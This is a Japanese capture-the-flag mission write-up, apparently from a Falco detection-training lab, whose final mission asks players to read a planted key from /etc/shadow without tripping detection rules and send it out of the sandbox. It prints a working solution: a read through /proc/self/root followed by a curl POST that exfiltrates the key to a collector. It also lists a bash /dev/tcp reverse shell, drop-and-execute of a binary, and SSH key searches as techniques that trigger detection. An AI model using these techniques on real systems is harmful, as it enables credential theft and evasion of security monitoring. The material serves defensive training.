# 10 — The Final Exfil (Boss)

集大成。master key を **発火させずに読み**、**箱の外の collector へ静かに
持ち出し (exfil)**、**submit** する。3 つすべてを満たして solve。単に読んで
submit するだけでは通らない(`requireExfil`)。

## 採点条件 (3 つすべて)

1. `submit` の flag が `expectedFlag` と一致
2. この attempt (このミッションが現在の課題になって以降) に `forbiddenRules`
   (7 つ) が 1 つも発火していない (時間では解除されない。発火した場合は
   Journey 画面の「このミッションをやり直す」ボタンでやり直す —
   その際 exfil 済みの証跡も無効化されるので、やり直した後は再度 exfil が必要)
3. その user が collector に正しい flag を exfil 済み
   (`POST /api/challenges/10-final-exfil/exfil`、`requireExfil: true`)

## なぜ 4-9 の知識が要るか(設計意図)

旧版は「sensitive file を読む」だけで完結し、`/proc/self/root`(Mission 03)
一発で解けた。本版は **exfil(持ち出し)を必須アクション**にすることで、
trigger 系ミッションの知識を「やってはいけないこと」として要求する:

| 必須アクション | 素朴なやり方(発火) | 回避(学んだ知識) |
|---|---|---|
| flag を読む | `cat /etc/shadow` → Read-sensitive | `/proc/self/root`(**03**) |
| 箱の外へ送る | `bash -i >& /dev/tcp/...` → C2(**08**) | curl で HTTP POST |
| 送信ツール用意 | 自前 exfil バイナリを drop+実行 → Drop+exec(**07**) | 既存の curl を使う |
| 鍵を漁る/退避 | `find -name id_rsa`/`grep 'PRIVATE KEY'`/`ln` → Search(**04/05**)/Hardlink(**09**) | やらない |

collector は **HTTP のみ受信**するので、reverse shell では物理的に届かない。
= 静かな HTTP 持ち出し(curl)が唯一の現実解。

## Flag

postStart (`plant.sh`) が `/etc/shadow` 末尾に `# CTF_MASTER_KEY: FALCO{...}`
を追記。実値はイベント毎に注入される。ローカルは dev default
`FALCO{dev-final-exfil}`。

## 想定解

```bash
# 1) 発火させずに読む (Mission 03)
FLAG=$(grep CTF_MASTER_KEY /proc/self/root/etc/shadow | awk '{print $NF}')

# 2) 既存 curl で collector へ静かに HTTP exfil
curl -s "${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil" \
  -H 'Content-Type: application/json' \
  -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"
#  → {"received":true,...}

# 3) そのまま提出 (禁止ルールを一度も発火させていなければ solve)
source /opt/ctf/submit.sh
submit 10-final-exfil "${FLAG}"
```

## 解説

- **exfil を必須化したのが肝**: 「読むだけ」では 03 一本に collapse する
  (`/proc/self/root` で全 sensitive file が読め、benign マーカーの grep は
  どのルールも踏まない)。持ち出しという *必須アクション* を足すことで、
  「派手な持ち出し = 発火」という 07/08 の教訓が初めて要求される。
- collector が HTTP 受信専用なのは意図的: reverse shell では届かないので、
  curl(既存バイナリ・dup を伴わない HTTP)に自然に誘導される。
- 禁止ルールの検査は二重の安全網: もし reverse shell や drop+exec を試して
  発火させると、この attempt はやり直すまで `evaded:false` で弾かれ続ける
  (時間では解除されない)。やり直すと exfil の証跡も消えるので、
  再挑戦する際は (2) からやり直す必要がある。
- 講評: 防御側は「検知点を増やす」だけでなく「攻撃者が必ず通る隘路
  (= 持ち出し)」に検知を置くほど、攻撃コストが跳ね上がる。
